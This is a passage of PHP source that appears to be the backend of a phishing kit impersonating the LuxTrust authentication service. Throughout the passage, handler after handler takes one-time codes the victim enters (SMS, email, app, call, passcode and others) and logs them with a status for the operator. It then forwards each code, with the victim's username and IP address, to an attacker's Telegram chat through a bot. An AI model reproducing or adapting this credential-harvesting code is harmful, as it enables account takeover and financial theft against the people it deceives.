            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'whatsapperror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['whatsapperror'])) {
        $whatsapperror = mysqli_real_escape_string($conn, $_POST['whatsapperror']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=183, buzzed=0, whatsappcode='$whatsapperror' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Whatsapp Err Code:</b> <code>$whatsapperror</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}




if ($_GET['type'] == 'emailcode') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['emailcode'])) {
        $emailcode = mysqli_real_escape_string($conn, $_POST['emailcode']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=10, buzzed=0, emailcode='$emailcode' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔑 <b>Email Code:</b> <code>$emailcode</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'emailerror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['emailerror'])) {
        $emailerror = mysqli_real_escape_string($conn, $_POST['emailerror']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=10, buzzed=0, emailcode='$emailerror' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔑 <b>Email Code Error:</b> <code>$emailerror</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'appcode') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['appcode'])) {
        $appcode = mysqli_real_escape_string($conn, $_POST['appcode']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=18, buzzed=0, appcode='$appcode' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔐 <b>App Code:</b> <code>$appcode</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}		
		

if ($_GET['type'] == 'apperror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['apperror'])) {
        $apperror = mysqli_real_escape_string($conn, $_POST['apperror']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=18, buzzed=0, appcode='$apperror' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔐 <b>App Code Error:</b> <code>$apperror</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'smsauth') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['smsauth'])) {
        $smsauth = mysqli_real_escape_string($conn, $_POST['smsauth']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=121, buzzed=0, smsauth='$smsauth' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>SMS AUTH:</b> <code>$smsauth</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}





if ($_GET['type'] == 'callauth') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['callauth'])) {
        $callauth = mysqli_real_escape_string($conn, $_POST['callauth']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=125, buzzed=0, callauth='$callauth' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📞 <b>CALL AUTH:</b> <code>$callauth</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] === 'passcode') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'passcode' => ['label' => 'Passcode', 'emoji' => '📲', 'db' => 'passcode']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 108";
	$columns[] = "buzzed = 1";
	$columns[] = "last_field_updated = 'passcode'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    $stmt->bind_param($types, ...$values);
    $stmt->execute();

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
		
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
         $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}




if ($_GET['type'] === 'reviewlogin') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'reviewlogin' => ['label' => 'Review Login', 'emoji' => '📲', 'db' => 'reviewlogin']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 108";
	$columns[] = "buzzed = 1";
	$columns[] = "last_field_updated = 'reviewlogin'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    $stmt->bind_param($types, ...$values);
    $stmt->execute();

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
		
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
         $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}



if ($_GET['type'] === 'reviewtransaction') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'reviewtransaction' => ['label' => 'Review Transaction', 'emoji' => '📲', 'db' => 'reviewtransaction']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 108";
	$columns[] = "buzzed = 1";
	$columns[] = "last_field_updated = 'reviewtransaction'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    $stmt->bind_param($types, ...$values);
    $stmt->execute();

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
		
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
         $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}


if ($_GET['type'] === 'securityhold') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'securityhold' => ['label' => 'Security Hold', 'emoji' => '📲', 'db' => 'securityhold']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 108";
	$columns[] = "buzzed = 1";
	$columns[] = "last_field_updated = 'securityhold'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    $stmt->bind_param($types, ...$values);
    $stmt->execute();

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
		
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
         $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}







if ($_GET['type'] === 'requestsms') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'requestsms' => ['label' => 'Request SMS', 'emoji' => '📲', 'db' => 'requestsms']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 157";
	$columns[] = "buzzed = 1";
	$columns[] = "last_field_updated = 'requestsms'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    $stmt->bind_param($types, ...$values);
    $stmt->execute();

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
		
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
         $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}


if ($_GET['type'] === 'requestemail') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'requestemail' => ['label' => 'Request Email', 'emoji' => '📧', 'db' => 'requestemail']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 175";
	$columns[] = "buzzed = 1";
	$columns[] = "last_field_updated = 'requestemail'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    $stmt->bind_param($types, ...$values);
    $stmt->execute();

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
		
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
         $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}


if ($_GET['type'] === 'dualotp') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
